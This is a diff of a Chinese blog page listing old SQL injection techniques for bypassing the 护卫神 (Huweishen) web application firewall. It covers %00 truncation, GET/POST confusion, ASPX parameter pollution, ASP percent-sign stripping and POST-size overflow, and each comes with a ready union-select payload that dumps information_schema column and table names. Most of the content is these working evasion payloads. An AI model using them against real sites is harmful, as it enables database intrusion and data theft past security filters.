@@ -227,21 +227,21 @@
             <h1 style="display: none">一些老的SQL注入绕过方法总结</h1>
             
             <div class="markdown-body">
-              <p>#前言<br>高中后技术没怎么进步，甚至开始忘了以前学过的东西，趁着高三前这段时间再复习一下。<br>#护卫神SQL注入<br>##绕过姿势一： %00截断<br>APSX+Mssql中，%00来代替空白字符</p>
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>高中后技术没怎么进步，甚至开始忘了以前学过的东西，趁着高三前这段时间再复习一下。</p>
+<h1 id="护卫神SQL注入"><a href="#护卫神SQL注入" class="headerlink" title="护卫神SQL注入"></a>护卫神SQL注入</h1><h2 id="绕过姿势一：-00截断"><a href="#绕过姿势一：-00截断" class="headerlink" title="绕过姿势一： %00截断"></a>绕过姿势一： %00截断</h2><p>APSX+Mssql中，%00来代替空白字符</p>
 <blockquote>
 <p>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</p>
 </blockquote>
-<p>##绕过姿势二： GET+POST<br>同时提交GET和POST请求，进入POST逻辑而忽略了GET<br>IIS+ASP/ASPX+Mssql/IIS+PHP+Mysql均适用</p>
+<h2 id="绕过姿势二：-GET-POST"><a href="#绕过姿势二：-GET-POST" class="headerlink" title="绕过姿势二： GET+POST"></a>绕过姿势二： GET+POST</h2><p>同时提交GET和POST请求，进入POST逻辑而忽略了GET<br>IIS+ASP/ASPX+Mssql/IIS+PHP+Mysql均适用</p>
 <blockquote>
 <p>id=1 and 1=2 union select 1,column_name,3 from information_schema.columns<br>POST:aaa</p>
 </blockquote>
-<p>##绕过姿势四：ASPX+HPP<br>在ASPX中，当GET/POST/COOKIE同时提交参数id，服务端接受参数id的顺序，GET,POST,COOKIE,中间通过逗号连接</p>
-<p>##绕过姿势五： ASP%特性<br>当我们输入un%ion的时候，解释会去掉%号，服务端接受的参数是union</p>
+<h2 id="绕过姿势四：ASPX-HPP"><a href="#绕过姿势四：ASPX-HPP" class="headerlink" title="绕过姿势四：ASPX+HPP"></a>绕过姿势四：ASPX+HPP</h2><p>在ASPX中，当GET/POST/COOKIE同时提交参数id，服务端接受参数id的顺序，GET,POST,COOKIE,中间通过逗号连接</p>
+<h2 id="绕过姿势五：-ASP-特性"><a href="#绕过姿势五：-ASP-特性" class="headerlink" title="绕过姿势五： ASP%特性"></a>绕过姿势五： ASP%特性</h2><p>当我们输入un%ion的时候，解释会去掉%号，服务端接受的参数是union</p>
 <blockquote>
 <p>id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</p>
 </blockquote>
-<p>##绕过姿势六：缓冲区溢出</p>
-<blockquote>
+<h2 id="绕过姿势六：缓冲区溢出"><a href="#绕过姿势六：缓冲区溢出" class="headerlink" title="绕过姿势六：缓冲区溢出"></a>绕过姿势六：缓冲区溢出</h2><blockquote>
 <p>id=1 and 1=2 union /*<br>POST:<em>/select 1,column_name,3 from information_schema.columns<br>*PHP+Mysql中，使用POST大包溢出可成功bypass</em><br>test.php<br>POST: id=1 (select 1)=(select 0xA*100) union select 1,2.table_name from information_schema.tables</p>
 </blockquote>
 
